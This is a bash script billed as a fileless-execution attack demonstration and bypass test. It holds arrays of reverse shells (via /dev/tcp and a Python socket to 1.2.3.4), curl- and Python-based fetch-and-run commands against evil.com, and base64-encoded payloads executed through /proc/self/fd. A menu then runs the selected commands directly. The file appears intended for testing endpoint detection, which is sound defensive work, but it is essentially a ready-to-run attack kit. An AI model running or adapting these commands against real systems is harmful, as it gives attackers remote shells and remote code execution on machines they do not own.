#!/bin/bash

# === Title ===
echo -e "\e[1;31m"
echo "███████╗██╗██╗     ███████╗██╗     ███████╗███████╗███████╗███████╗"
echo "██╔════╝██║██║     ██╔════╝██║     ██╔════╝██╔════╝██╔════╝██╔════╝"
echo "███████╗██║██║     █████╗  ██║     █████╗  ███████╗███████╗███████╗"
echo "╚════██║██║██║     ██╔══╝  ██║     ██╔══╝  ╚════██║╚════██║╚════██║"
echo "███████║██║███████╗███████╗███████╗███████╗███████║███████║███████║"
echo "╚══════╝╚═╝╚══════╝╚══════╝╚══════╝╚══════╝╚══════╝╚══════╝╚══════╝"
echo -e "\e[0m"
echo -e "\e[1;32m      Fileless Execution Attack Demonstration Tool (Bypass Test)\e[0m"
echo

# === Attack Arrays ===
reverse_shells=(
"bash -c 'exec 5<>/dev/tcp/1.2.3.4/4444; cat <&5 | while read line; do \$line 2>&5 >&5; done'"
"bash -c 'exec \${FD:-5}<>/dev/tcp/1.2.3.4/5555; while read -r line <&\${FD}; do bash -c \"\$line\" 2>&\${FD} >&\${FD}; done'"
"exec 16< <(bash -c 'bash -i >& /dev/tcp/1.2.3.4/9001 0>&1'); bash /proc/self/fd/16"
"exec 17< <(python3 -c \"import socket,os;s=socket.socket();s.connect(('1.2.3.4',9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.execvp('bash',['bash'])\"); bash /proc/self/fd/17"
)

curl_based=(
"curl -s http://evil.com/payload.sh | sh"
"bash -c \"eval \$(curl -s http://evil.com/payload.sh)\""
"bash -c \"\$(curl -s http://evil.com/payload.sh)\""
"exec 10< <(curl -s http://evil.com/payload.sh); bash /proc/self/fd/10"
"exec 11< <(bash -c 'bash -c \"\$(curl -s http://evil.com/payload.sh)\"'); bash /proc/self/fd/11"
"exec 12< <(bash -c \"eval \$(curl -s http://evil.com/payload.sh)\"); bash /proc/self/fd/12"
"exec 14< <(curl -fsSL http://evil.com/.a); bash /proc/self/fd/14"
)

python_based=(
"exec 3< <(python3 -c \"import urllib.request;print(urllib.request.urlopen('http://evil.com/payload.sh').read().decode())\"); bash /proc/self/fd/3"
"exec 4< <(python3 -c \"import os; os.system('curl -s http://evil.com/payload.sh | bash')\"); bash /proc/self/fd/4"
"exec 5< <(python3 -c \"import subprocess; subprocess.run('curl -s http://evil.com/payload.sh | bash', shell=True)\"); bash /proc/self/fd/5"
"exec 13< <(python3 -c \"import urllib.request as r;print(r.urlopen('http://evil.com/payload.sh').read().decode())\"); bash /proc/self/fd/13"
"exec 20< <(python3 -c \"exec(__import__('urllib.request').urlopen('http://evil.com/code').read().decode())\"); bash /proc/self/fd/20"
)

encoded=(
"exec 6< <(python3 -c \"import base64;exec(base64.b64decode('ZWNobyAnSGVsbG8gZmlsZWxlc3Mn'))\"); bash /proc/self/fd/6"
"exec 7< <(echo 'ZWNobyAnRkQgdGVzdCcK' | base64 -d); bash /proc/self/fd/7"
"exec 8< <(bash -c 'echo pwned'); bash /proc/self/fd/8"
"exec 9< <(sh -i); /proc/self/fd/9"
"exec 15< <(curl -s http://evil.com/x | base64 -d); bash /proc/self/fd/15"
"exec 18< <(bash -c \"\$(curl -s http://evil.com/run.sh | base64 -d)\"); bash /proc/self/fd/18"
"exec 19< <(printf 'IyEvYmluL2Jhc2gKZWNobyBoYWNrZWQgdmlhIGZpbGVsZXNz' | base64 -d); bash /proc/self/fd/19"
)

# === Menu ===
echo -e "\e[1;34mChoose attack category:\e[0m"
echo "1) Reverse Shell (/dev/tcp)"
echo "2) Curl-Based Execution"
echo "3) Python-Based Execution"
echo "4) Encoded Payloads"
echo "5) Run ALL Attacks"
read -p $'\nSelect option [1-5]: ' choice

run_attacks() {
  local -n arr=$1
  for cmd in "${arr[@]}"; do
    echo -e "\n\e[1;33m[EXEC]\e[0m $cmd"
    bash -c "$cmd"
  done
}

echo

case $choice in
  1) run_attacks reverse_shells ;;
  2) run_attacks curl_based ;;
  3) run_attacks python_based ;;
  4) run_attacks encoded ;;
  5)
    run_attacks reverse_shells
    run_attacks curl_based
    run_attacks python_based
    run_attacks encoded
    ;;
  *) echo -e "\e[1;31mInvalid option. Exiting.\e[0m" ;;
esac
